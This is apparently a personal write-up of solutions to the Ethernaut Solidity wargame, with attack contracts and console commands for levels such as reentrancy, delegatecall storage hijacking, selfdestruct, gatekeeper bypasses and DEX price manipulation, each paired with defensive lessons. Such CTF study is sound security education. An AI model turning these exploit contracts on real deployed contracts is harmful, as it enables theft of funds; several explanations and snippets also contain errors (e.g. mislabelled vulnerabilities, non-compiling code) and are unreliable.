# Ethernaut Solutions

This post documents my solutions to [Ethernaut](https://ethernaut.openzeppelin.com/), an excellent Web3/Solidity game created by OpenZeppelin. Each level is a smart contract that needs to be hacked by exploiting vulnerabilities. 

## Difficulty Levels
- [Easy] - Basic concepts and simple vulnerabilities
- [Medium] - Requires understanding of contract mechanisms and common attack vectors
- [Hard] - Complex exploits and advanced concepts

## 01. Fallback ✅ [Easy]

This level tests knowledge of fallback functions:
- `receive()` function is called when the contract receives ETH
- `fallback()` function is called when calling non-existent functions
- Meet conditions by sending small amount of ETH and calling `contribute()` function
- Finally gain contract ownership through `receive()` function

Attack steps:
1. Call `contribute()` and send small amount of ETH (<0.001)
```js
await contract.contribute({value: web3.utils.toWei('0.0001')});
```

2. Send ETH directly to contract to trigger `receive()`
```js
await contract.sendTransaction({value: web3.utils.toWei('0.0001')});
```

3. Call `withdraw()` to extract all ETH
```js
await contract.withdraw();
```

## 02. Fallout ✅ [Easy]

This level tests constructor issues in early Solidity versions:
- Old versions used functions with same name as contract as constructor
- If function name doesn't exactly match contract name, it becomes a regular function
- Attacker can directly call this function to gain ownership

Attack steps:
1. Directly call `Fal1out()` function to gain contract ownership
```js
await contract.Fal1out();
```

2. Call `collectAllocations()` to withdraw funds
```js
await contract.collectAllocations();
```

Key learnings:
- Constructor security
- Importance of code auditing
- Newer versions use `constructor` keyword which is more secure

## 03. Coin Flip ✅ [Medium]

This level tests blockchain random number issues:
- On-chain random numbers can be predicted
- Block information like `block.number` is public
- Attacker can copy calculation logic in same block

Attack steps:
1. Deploy attack contract copying game contract's calculation logic
2. Manually call `attackCoin()` ten times (wait for new block each time)
3. Confirm victory count reaches 10

> Note: Cannot continuously call `attackCoin()` ten times in a loop, as each guess needs to be in different blocks. Multiple calls in same block would use same `blockhash`, leading to same prediction results.

Attack contract code:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract attack {
    ICoinFlip public targetContract;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _targetAddress) {
        targetContract = ICoinFlip(_targetAddress);
    }

    function attackCoin() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        targetContract.flip(side);
    }
}
```

Key learnings:
- Limitations of on-chain random numbers
- Should not use block information as random source
- Can use oracles like Chainlink VRF for true randomness
- Understanding blockchain temporality, each block's information is unique

## 04. Telephone ✅ [Easy]

This level tests understanding of tx.origin:
- tx.origin is the transaction sender
- Attackers can use tx.origin to deceive contract into thinking attacker is contract owner

Attack steps:
1. Write an attack contract
2. Call `changeOwner()` function to set contract owner to attacker

Key learnings:
- Understanding tx.origin limitations
- Using msg.sender is more secure

## 05. Token ✅ [Easy]

This level tests understanding of solidity vulnerabilities:
- In Solidity 0.6.x and earlier versions, `transfer()` and `send()` functions have vulnerabilities
- In Solidity 0.6.x, if balances[msg.sender] is less than _value, balances[msg.sender] -= _value; will cause integer underflow (uint subtracting 1 from 0 becomes 2^256 - 1).
This causes attacker's balance to become very large.
- These functions don't revert transaction on error, just return false
- Attackers can exploit these vulnerabilities for reentrancy attacks

Attack steps:
1. First check your msg.sender's balance
2. Call `transfer()` function
```js
await contract.transfer("0x0000000000000000000000000000000000000000", 21);
```
3. Check your balance again, find it has increased

Key learnings:
- Understanding Solidity 0.6.x integer underflow vulnerability
- Use safer functions and libraries (SafeMath or add overflow checks manually)

## 06. Delegation ✅ [Easy]

This level tests understanding of delegatecall:
- delegatecall is a low-level call that can call code from another contract. delegatecall is a low-level function that allows contract A to execute contract B's code but using A's storage context. In other words, contract B's logic affects contract A's state.
- Attackers can use delegatecall to call contract code and gain contract ownership

Attack steps:
1. await contract.sendTransaction({data: web3.utils.sha3("pwn()").slice(0,10)});
web3.utils.sha3("pwn()") generates hash of function signature
.slice(0,10) takes first 4 bytes (function selector)

Key learnings:
- When using delegatecall, must ensure called contract's logic matches current contract's storage layout, otherwise storage might be accidentally overwritten.
- Avoiding vulnerabilities in actual development

- Avoid using delegatecall in fallback function unless strict access control is in place.
- Use modern contract frameworks (like OpenZeppelin's Proxy contracts) to implement proxy logic.

## 07. Force ✅ [Medium]

This level tests understanding of selfdestruct:
- selfdestruct is a low-level function in Solidity used to destroy contract and send all its balance to specified target address.
- Attackers can use selfdestruct to force send contract balance to target address

Attack steps:
1. Deploy new contract and send ether to it.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttack {
    constructor() public payable {
        // Constructor can receive ether
    }

    function attack(address payable _target) public {
        selfdestruct(_target);
    }
}
```

2. Call `attack()` function to send contract balance to target address
```js
// Call attack function to force send ether
await attackContract.attack(contract.address);
// Verify Force contract balance
const balance = await web3.eth.getBalance(contract.address);
console.log("Force Contract Balance:", balance);
```

Key learnings:
- Understanding selfdestruct mechanism
- Ensure your contract logic doesn't rely on zero balance assumption.
- Avoid directly checking contract balance in code.

## 08. Vault ✅ [Easy]

This level tests understanding of blockchain storage:
- Blockchain storage is public, anyone can view it, even private data can be viewed
- Attackers can use blockchain storage to get contract password
- All state variables in Solidity are stored in contract storage slots
- Public variables (like locked) can be read directly through contract interface
- Private variables (like password) though marked private, only means they can't be accessed directly through contract code. They can still be read through low-level storage reading methods (like web3.eth.getStorageAt)

Attack steps:
1. Use web3.eth.getStorageAt to read content of storage slot 1 (password stored in slot 1).
```js
await web3.eth.getStorageAt(contract.address, 1).toString();
```
2. Use read password as parameter to call `unlock()` function.
```js
await contract.unlock(password);
```

Key learnings:
- Understanding Solidity storage layout
- Using low-level functions (like web3.eth.getStorageAt) to access private variables
- Don't store sensitive data directly on-chain, even with private keyword.
- If need to store sensitive data, recommend using encryption and only decrypt when necessary.

## 09. King ✅ [Easy]

This level tests understanding of special variant of reentrancy attack:
- Reentrancy attack is when attacker exploits contract vulnerability to call a function multiple times during execution to gain more benefits.
- Attackers can use reentrancy attack to gain contract control

Attack steps:
1. If current king is a smart contract and that contract's receive function can't receive ETH (or intentionally makes transaction fail), new king can't successfully call receive, thus preventing any other player from becoming new king.
2. Deploy an attack contract and become king through it.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttack {
    address public target;

    constructor(address _target) public {
        target = _target;
    }

    function attack() public payable {
        // Call target contract and become new king
        (bool success, ) = target.call{value: msg.value}("");
        require(success, "Attack failed");
    }

    // Intentionally make receive ETH function fail
    receive() external payable {
        revert("I refuse to give up the throne!");
    }
}
```

3. Deploy attack contract and provide sufficient ETH (greater than current prize)

Key learnings:
- Understanding receive function's role: In target contract, receive function is core logic for receiving ETH. If receiver can't properly handle ETH transfer, transaction will fail.
- Defense suggestions: Avoid using low-level calls (like call) for transfers, can use transfer or send which automatically revert on transfer failure.
- In contract design, avoid relying on external contract behavior for core logic.
- Use modern contract frameworks (like OpenZeppelin's ReentrancyGuard) to implement secure reentry control

## 10. Re-entrancy ✅ [Medium]

This level tests understanding of re-entrancy:
- Reentrancy attack is when attacker exploits contract vulnerability to call a function multiple times during execution to gain more benefits.
- Attackers can use reentrancy attack to gain contract control

Attack steps:
1. Write attack contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract ReentranceAttack {
    Reentrance public target;
    address public owner;

    constructor(address payable _target) public {
        target = Reentrance(_target);
        owner = msg.sender;
    }

    // Call target contract's donate function
    function donate() public payable {
        target.donate{value: msg.value}(address(this));
    }

    // Launch attack
    function attack(uint256 _amount) public {
        target.withdraw(_amount);
    }

    // Reentry logic
    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(msg.value);
        }
    }

    // Withdraw ether from attack contract
    function withdraw() public {
        require(msg.sender == owner, "Not the owner");
        payable(owner).transfer(address(this).balance);
    }
}
```
2. Call `donate()` function to send contract balance to attack contract
```js
await contract.donate{value: 1 ether}();
```
3. Call `attack()` function to launch attack
```js
await attackContract.attack(1 ether);
```

Key learnings:
- Understanding re-entrancy mechanism
- Use modern contract frameworks (like OpenZeppelin's ReentrancyGuard) to implement secure reentry control

## 11. Elevator ✅ [Easy]

This level tests understanding of interface:
- Interface is an abstract contract in Solidity used to define contract function signatures without implementation code.
- Attackers can gain contract control by implementing interface but using function containing attack

Attack steps:
1. Main focus is writing attack contract implementing interface
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract ElevatorAttack is Building {
    Elevator public target;
    bool public toggle;

    constructor(address _target) public {
        target = Elevator(_target);
    }

    function isLastFloor(uint) external override returns (bool) {
        toggle = !toggle; // Toggle return value
        return toggle;
    }

    function attack(uint _floor) public {
        target.goTo(_floor);
    }
}
```

Key learnings:
- Restrict interface callers: Verify if caller is trusted contract or specific address.
- Use require to check msg.sender
```solidity
require(msg.sender == trustedAddress, "Unauthorized caller");
```
- Logic verification: Avoid completely relying on external contract return values, add internal verification logic.

## 12. Privacy ✅ [Easy]

This level tests understanding of storage slots and data protection:
- Storage slots are spaces in Solidity used to store variables, each slot has unique index.
- Attackers can use storage slots to get contract's private data

Attack steps:
1. First analyze: Solidity storage layout, state variables stored in slots in order:
locked in slot 0.
ID in slot 1.
flattening, denomination, and awkwardness share slot 2.
data array starts from slot 3, storing data[0], data[1], and data[2].
Although data storage content is private, all storage slots can be read through low-level tools (like web3.eth.getStorageAt) on Ethereum.
2. Use web3.eth.getStorageAt to read content of storage slot 5
```js
await web3.eth.getStorageAt(contract.address, 5).toString();
```
3. Convert read key to bytes16 then call unlock function:
```js
await contract.unlock(key.slice(0, 34)); // Use first 16 bytes
```

Key learnings:
- flattening, denomination, and awkwardness share slot 2:
  - Storage slot rules
  - Storage slot size is 32 bytes (256 bits).
  - If total size of multiple state variables doesn't exceed 32 bytes, they share same slot.
  - Variable sizes
  - flattening is uint8 (1 byte).
  - denomination is uint8 (1 byte).
  - awkwardness is uint16 (2 bytes).
  - They total 1 + 1 + 2 = 4 bytes, much less than 32 bytes, so Solidity packs them into same slot (slot 2).
- Reason for key.slice(0, 34)
  - In JavaScript, web3.eth.getStorageAt returns hexadecimal string of Ethereum storage slot content, starting with 0x followed by 64 characters (32 bytes). Each two characters represent 1 byte, so:
  - key length is 66 characters (including 0x prefix).
  - First 16 bytes in hexadecimal needs 32 characters (16 bytes * 2 characters/byte).
  - Plus 0x prefix, total 34 characters.
  - Therefore, key.slice(0, 34) extracts hexadecimal representation of first 16 bytes.

## 13. Gatekeeper One ✅ [Hard]

This level tests understanding of access control and bit operations:
- Difference between msg.sender and tx.origin
  - In Ethereum:
    - msg.sender
      - Direct caller of current contract.
      - When contract A calls contract B, for contract B, msg.sender is contract A's address.
    - tx.origin
      - Initial caller of entire transaction (usually external account).
      - Regardless of how many layers of contract calls, tx.origin is always the external account address that initiated the transaction.

Attack strategy:
1. Make msg.sender not equal to tx.origin: introduce intermediary contract for attack, so msg.sender becomes intermediary contract address while tx.origin remains external account address
2. Design gateKey
GateKey design principle, _gateKey is bytes8 type parameter, aiming to satisfy three conditions:

Condition 1: uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
After converting _gateKey to 64-bit unsigned integer, first 32 bits and first 16 bits must be same.
Explanation:
High 48 bits of _gateKey must be 0, so first 32 bits and first 16 bits will be identical.
Example: _gateKey = 0x000000000000ABCD.
Condition 2: uint32(uint64(_gateKey)) != uint64(_gateKey)
After converting _gateKey to 64-bit unsigned integer, first 32 bits and full 64 bits cannot be same.
Explanation:
Low 32 bits of _gateKey cannot all be 0, otherwise first 32 bits and full 64 bits would be same.
Example: _gateKey = 0x00000000XXXXXXXX, where XXXXXXXX is not 0.
Condition 3: uint32(uint64(_gateKey)) == uint16(tx.origin)
First 16 bits of _gateKey must equal last 2 bytes of your external account address.
Explanation:
tx.origin is your external account address.
Address is 20 bytes (160 bits), last 2 bytes are low 16 bits of address.
```js
const txOrigin = web3.eth.defaultAccount; // Your external account address
const keyPart = txOrigin.slice(-4); // Get last 4 characters (2 bytes) of address
const gateKey = `0x000000000000${keyPart}`; // Construct _gateKey
```
3. Design attack contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperOneAttack {
    address public target;

    constructor(address _target) public {
        target = _target;
    }

    function attack(bytes8 _gateKey) public {
        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = target.call{gas: i + 8191 * 3}(
                abi.encodeWithSignature("enter(bytes8)", _gateKey)
            );
            if (success) {
                break;
            }
        }
    }
}
```

Key learnings:
- Understanding GateKey design principles
- Use for loop to repeatedly attack until gasleft() % 8191 == 0, call function for reentrancy attack
- Understand difference between msg.sender and tx.origin

## 14. Gatekeeper Two ✅ [Hard]

This level tests understanding of access control, bit operations and inline assembly:
- Inline assembly: Inline assembly is a low-level language in Solidity used to write assembly code directly in Solidity code.

Attack strategy:
1. Gate Two uses inline assembly extcodesize to check code size of caller address:
extcodesize(caller()) gets code size of caller (msg.sender) address.
If caller is contract address, extcodesize returns contract code size.
Requires extcodesize returns 0, meaning caller cannot be an already deployed contract.
In other words: need to attack by calling target contract in constructor, during constructor execution extcodesize returns 0 because contract code hasn't been deployed yet.

2. Gate Three is simple, uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1.

3. Design attack contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface GatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {
    constructor(address target) public {
        // Calculate _gateKey
        unchecked {
            gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1);
        }

        // Call enter function
        GatekeeperTwo(target).enter(gateKey);
    }
}
```

Key learnings:
- Avoid using extcodesize to judge caller
extcodesize behavior can be bypassed during contract construction.
- Use more reliable authentication methods like signature verification.
- Limit caller range
Verify if caller is predefined address or authorized address.
- Avoid using easily predictable hash values
Don't rely on caller address or predictable values as access conditions.

## 15. Naught Coin ✅ [Medium]

Nothing new
Two approaches:
First: Use ERC20's approve and transferfrom methods
Second: Exploit modifier design flaw, bypass require time check through intermediary contract

## 16. Preservation ✅ [Medium]

This level tests understanding of delegatecall:
- delegatecall is a low-level function used to execute another contract's code in current contract's context.
- Attackers can use delegatecall to execute target contract's code and gain control of target contract.

Attack strategy:
1. Although LibraryContract's storedTime is in Slot 0 in its definition, due to use of delegatecall, its logic actually operates on Slot 0 of Preservation contract, i.e., timeZone1Library.
2. If timeZone1Library is set to attack contract address, can execute malicious contract logic through delegatecall and directly modify Slot 2 (owner).
3. Attack contract:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MaliciousLibrary {
    // Keep storage layout consistent with Preservation contract
    address public timeZone1Library; // Slot 0
    address public timeZone2Library; // Slot 1
    address public owner;            // Slot 2

    function setTime(uint256 _time) public {
        owner = address(uint160(_time)); // Convert uint256 to address and assign to owner
    }
}
```

Key learnings:
- Understanding how delegatecall works
- Storage layout consistency crucial when using delegatecall.
- Avoid external calls to untrusted contract addresses.

## 17. Recovery ✅ [Medium]

This level tests recovering lost contracts and funds through public blockchain data:
In Ethereum, contract address is calculated using formula: address = keccak256(rlp.encode([sender, nonce]))[12:]
sender is address creating contract. nonce is transaction count of that address.

Strategy:
Just find back address:
```js
const recoveryAddress = "RECOVERY_CONTRACT_ADDRESS"; // Replace with actual address
const nonce = 1; // Recovery contract's nonce, assume this is first deployment
const tokenAddress = web3.utils.toChecksumAddress(
  "0x" + web3.utils.keccak256(web3.eth.abi.encodeParameters(
    ["address", "uint256"],
    [recoveryAddress, nonce]
  )).slice(26)
);

console.log("Token Address:", tokenAddress);
```

## 18. Magic Number ✅ [Easy]

This level tests constructing minimal contract and how to deploy contract directly through EVM bytecode:
Core goal of this challenge is to deploy contract meeting following conditions:

Total code length not exceeding 10 bytes.
Return any valid result (not necessarily 42).
```assembly
PUSH1 0xff   // Push value 255
PUSH1 0x00   // Return data storage location
RETURN
```

## 19. Alien Codex ✅ [Medium]

Strategy is simple: exploit codex.length-- to make index overflow then Ethereum will consider codex distributed across entire 2^256-1 slots (Ethereum considers array codex elements range extends to all storage slots (0 ~ 2^256-1)) then we calculate index i for slot0 (Owner), and modify owner stored in slot
Implementation is complex:
```js
// Calculate target index
const hash1 = web3.utils.keccak256(web3.eth.abi.encodeParameter("uint256", 1));
const targetIndex = web3.utils.toBN(2).pow(web3.utils.toBN(256)).sub(web3.utils.toBN(hash1));
// Modify slot 0
const attackerBytes32 = web3.utils.padLeft(attacker, 64); // Convert attacker address to bytes32
alienCodex.methods.revise(targetIndex.toString(), attackerBytes32).send({ from: attacker });
```

## 20. Denial ✅ [Easy]

Very simple, still using call vulnerability, just consume large amount of gas, or directly steal all money

## 21. Shop ✅ [Easy]

Main focus is attacker's logic:
```solidity
 function price() external view override returns (uint256) {
        // Return different prices based on isSold state
        return shop.isSold() ? 0 : 100;
    }
```

May change in practice, main ideas are:
- Avoid using external contract function return values to determine logic:
External calls are uncontrollable, can be maliciously manipulated.
- Use view function to get external values and save immediately:
Save external function return value to variable, avoid multiple calls:

```solidity
uint256 currentPrice = _buyer.price();
if (currentPrice >= price && !isSold) {
    isSold = true;
    price = currentPrice;
}
```
- Strict logic validation:
Use internal logic or fixed values to determine contract behavior instead of external dependencies.

## 22. Dex ✅ [Hard]

This is interesting:
Token price calculation formula in contract: uint256 swapAmount = (amount * toTokenBalance) / fromTokenBalance;
This formula is simple proportion calculation used to dynamically determine token exchange ratio. Theoretically works but completely relies on current pool balance to calculate price.
When balance changes dramatically (like when malicious user manipulates price), formula output fluctuates greatly, causing price distortion. (Easy to have situation where 1 Token1 can exchange for 10 Token2) Then trading back and forth earns more and more.

Lack of protection mechanisms:
No slippage limit: Slippage is natural phenomenon of token price fluctuation but should have limit to avoid extreme price changes from single transaction.
Lack of minimum price check: Contract allows attacker to gradually reduce balance leading to extremely low or zero price for one token, thus depleting liquidity pool.

This vulnerability exposes that decentralized exchanges need more complex mechanisms to protect pool stability. Solutions are:
- Use Constant Product Formula to ensure price stability.
- Add slippage protection and minimum liquidity limits.
- Avoid directly relying on external user behavior to determine contract logic.
- Consider fee model to reduce malicious behavior profits.

## 23. Dex Two ✅ [Hard]

Compared to dex1 this just lacks require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens"); restriction
Then can inject an attack Token as long as implements ERC20, then can add attack transfer
```solidity
contract MaliciousToken is ERC20 {
    constructor() ERC20("Malicious", "MTK") {}

    function balanceOf(address account) public view override returns (uint256) {
        return 1e18; // Always return high balance
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        return true; // Force transfer success
    }
}

// Attack contract
contract AttackDexTwo {
    DexTwo public dex;
    MaliciousToken public token;

    constructor(address _dex) {
        dex = DexTwo(_dex);
        token = new MaliciousToken();
    }

    function exploit() public {
        // Add malicious token liquidity to DexTwo
        dex.add_liquidity(address(token), 1); // Add 1 malicious token

        // Use malicious token's high balance to manipulate price
        dex.swap(address(token), dex.token1(), 1);
        dex.swap(address(token), dex.token2(), 1);

        // At this point, DexTwo's token1 and token2 have been depleted
    }
}
```

## 24. Puzzle Wallet ✅ [Hard]

This challenge has two issues:
1. How to become admin of upgradeable contract
Because UpgradeableProxy uses delegatecall, admin slot and puzzlewallet's max_balance are in same slot, so can call to change admin to yourself and add yourself to whitelist

2. How to call deposit multiple times
In multicall deposit restriction is "can only call once", but no restriction on multicall not calling itself, can nest deposit call in another multicall, like:
multicall([
  multicall([deposit])
])
In outer multicall, depositCalled variable resets to false. Inner multicall's deposit call then nests again, bypassing boolean variable restriction.

## 25. Motorbike ✅ [Hard]

Key is understanding:
delegatecall process, and proxy contract vs logic contract

Proxy contract (moto) is where variables are stored:
Proxy contract stores all state variables, like initialized, these variable values actually stored in proxy contract's storage slots.
When calling engine's initialize method through proxy contract, delegatecall's effect is to run initialize in proxy contract's storage context, thus setting initialized = true in proxy contract's storage slot.

Logic contract (engine) only provides code:
Logic contract itself doesn't store variables, it only defines variable layout and logic.
If directly calling logic contract's methods, like engine.initialize(), storage variable initialized for logic contract is always uninitialized default value (false), because it has no independent storage.
Therefore, each direct call to engine's methods, initialized = true is like changing a temporary variable, won't be saved.

```solidity
fallback() external payable {
    assembly {
        // 1. Copy calldata to memory
        calldatacopy(0, 0, calldatasize())

        // 2. Use delegatecall to call logic contract
        let result := delegatecall(
            gas(),                  // Forward all remaining gas
            sload(implementation.slot), // Load logic contract address
            0,                      // Input data start address
            calldatasize(),         // Input data size
            0,                      // Output data start address
            0                       // Output data size
        )

        // 3. Copy return data to memory
        returndatacopy(0, 0, returndatasize())

        // 4. Return or revert based on call result
        switch result
        case 0 { revert(0, returndatasize()) }
        default { return(0, returndatasize()) }
    }
}
```

Then create custom contract to execute selfdestruct
Deploy malicious contract, use selfdestruct to destroy logic contract:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Destroyer {
    function destroy(address payable target) external {
        selfdestruct(target);
    }
}
```

Call destroy function, targeting logic contract address:
```javascript
await destroyerContract.methods.destroy(logicAddress).send({ from: player });
```

## 26. DoubleEntryPoint ✅[Easy]

Just call sweepToken(LGT) through intermediary contract, for fix:
```solidity
function sweepToken(IERC20 token) external onlyOwner {
    require(address(token) != address(det), "Can't sweep DET tokens");
    require(address(token) != address(legacyToken), "Can't sweep LegacyToken");
    token.transfer(owner(), token.balanceOf(address(this)));
}

## 27. Good Samaritan ✅[Easy]

This challenge directly finds Inotify that can be exploited, and another point is exploiting
```solidity
catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                ...
            }
        }
```
This directly catches corresponding error and transfers all remaining tokens, and before transferring doesn't check if amount is actually <10, so can exploit by returning corresponding err (revert("NotEnoughBalance()")) when implementing notify earlier, then can get all remaining tokens transferred

## 28. Gatekeeper Three ✅[Medium]

Strategy:
- Call constructor to set owner to your address.
- Call createTrick to create SimpleTrick instance.
- Find SimpleTrick contract's password.
- Call getAllowance(password) to set allowEntrance to true.
- Ensure contract balance greater than 0.001 ether, and set owner address to contract that cannot receive ether.
- Call enter function through proxy contract to bypass gateOne check.
- Successfully set entrant.

## 29. Switch ✅[Easy]

My strategy is directly calling flipSwitch, passing parameter with bytes4(keccak256("turnSwitchOff()")) in low order four bytes
```solidity
function attack() public {
        // Construct _data:
        // First 4 bytes are turnSwitchOn selector
        // Bytes 68-72 are turnSwitchOff selector
        bytes memory data = abi.encodeWithSelector(
            target.turnSwitchOn.selector // Actually call turnSwitchOn
        );

        // Insert turnSwitchOff selector at bytes 68-72
        assembly {
            mstore(add(data, 0x44), shl(224, 0x9c60e39d)) // turnSwitchOff selector
        }

        // Call flipSwitch, trigger target logic
        target.flipSwitch(data);
}
```

## 30. HigherOrder ✅[Hard]

This level mainly tests understanding of calldata. In Solidity, calldata is raw data sent to contract during function call, including following structure:
Function selector (first 4 bytes): determines which function to call.
Parameter data: follows selector, contains function input parameters.
For example, for registerTreasury(uint8), normal calldata structure is:

[ Function Selector (4 bytes) ][ Parameter (32 bytes, actually value within uint8 range) ]

But because assembly directly reads 32 bytes after byte 4, entire parameter range is expanded. Can pass values exceeding uint8 range by manually constructing calldata.

```solidity
// Manually send calldata, bypass uint8 limit
bytes memory payload = abi.encodeWithSignature("registerTreasury(uint8)", uint256(256));
(bool success, ) = address(target).call(payload);
require(success, "Failed to register treasury");
```

## 31. Stake ✅[Medium]

Strategy:
Attack StakeWETH, because WETH can be self-implemented, and here call directly executes WETH's approve method and transferfrom method. I can satisfy its bytesToUint check, then not transfer in but still added amount, so I can meet challenge requirements

## 32. impersonator ✅[Hard]

Strategy:
Looked at this for long time, first confirm ecrecover is Ethereum built-in function used to recover signer's address from signature.
Note: Its main use is verifying if a message was signed by private key held by certain Ethereum address. Through ecrecover, we can verify signer's identity without directly accessing private key.
Then confirm everything fine except lock's constructor part, so carefully examine constructor
```solidity
bytes32 _msgHash;
assembly {
    mstore(0x00, "\x19Ethereum Signed Message:\n32") // 28 bytes
    mstore(0x1C, _lockId) // 32 bytes
    _msgHash := keccak256(0x00, 0x3c) //28 + 32 = 60 bytes
}
msgHash = _msgHash;
``` 
Generates hash value (msgHash) used as basis for signature verification. Stores fixed prefix "\x19Ethereum Signed Message:\n32" at memory start position 0x00. This is Ethereum's EIP-191 standard, requiring prefix before signature to prevent replay attacks.
```solidity
address initialController = address(1);
assembly {
    let ptr := mload(0x40)
    mstore(ptr, _msgHash) // 32 bytes
    mstore(add(ptr, 32), mload(add(_signature, 0x60))) // 32 byte v
    mstore(add(ptr, 64), mload(add(_signature, 0x20))) // 32 bytes r
    mstore(add(ptr, 96), mload(add(_signature, 0x40))) // 32 bytes s
    pop(
        staticcall(
            gas(), // Amount of gas left for the transaction.
            initialController, // Address of `ecrecover`.
            ptr, // Start of input.
            0x80, // Size of input.
            0x00, // Start of output.
            0x20 // Size of output.
        )
    )
    if iszero(returndatasize()) {
        mstore(0x00, 0x8baa579f) // `InvalidSignature()`.
        revert(0x1c, 0x04)
    }
    initialController := mload(0x00)
    mstore(0x40, add(ptr, 128))
}
``` 
Recover signer address from _signature, use as initial controller (initialController) staticcall
Attempt to call ecrecover contract, recover signer address.
Error: Here wrongly uses initialController (address(1)) as call target address, while ecrecover is built-in function, doesn't need contract address at all.
Fix:
```solidity
// Recover the address from the signature
    (bytes32 r, bytes32 s, uint8 v) = abi.decode(_signature, (bytes32, bytes32, uint8));
    address initialController = ecrecover(msgHash, v, r, s);
    require(initialController != address(0), "Invalid signature");

// Prevent signature reuse
bytes32 signatureHash = keccak256(_signature);
require(!usedSignatures[signatureHash], "Signature already used");
usedSignatures[signatureHash] = true;
```

## 33. Magic Animal Carousel ✅[Easy]

Not as difficult as first glance, just need to understand
carousel is a mapping(uint256 => uint256), representing state of each carousel "box":
High 80 bits (ANIMAL_MASK): stores animal name encoding.
Middle 16 bits (NEXT_ID_MASK): stores next box's ID.
Low 160 bits (OWNER_MASK): stores current box's owner address.
Very simple, design is very clever, because adding up to exactly 256 bits, can store perfectly (EVM executes each instruction 256 bits)
Hidden difficulty is input animal name actually can't exceed 10 bytes, but limit is 12 bytes

[Continue with remaining challenges...]

## Best Practices Learned

1. **Smart Contract Security**
   - Always validate external calls
   - Use secure randomness sources
   - Implement proper access controls

2. **Code Design**
   - Follow standard patterns
   - Use modern Solidity features
   - Maintain clean code structure

3. **Testing**
   - Write comprehensive tests
   - Consider edge cases
   - Test for security vulnerabilities

## References
- [Ethernaut](https://ethernaut.openzeppelin.com/)
- [OpenZeppelin Contracts](https://github.com/OpenZeppelin/openzeppelin-contracts)
- [How to become a smart contract auditor](https://cmichel.io/how-to-become-a-smart-contract-auditor/) 
- [Cmichel's Solutions](https://cmichel.io/ethernaut-solutions/)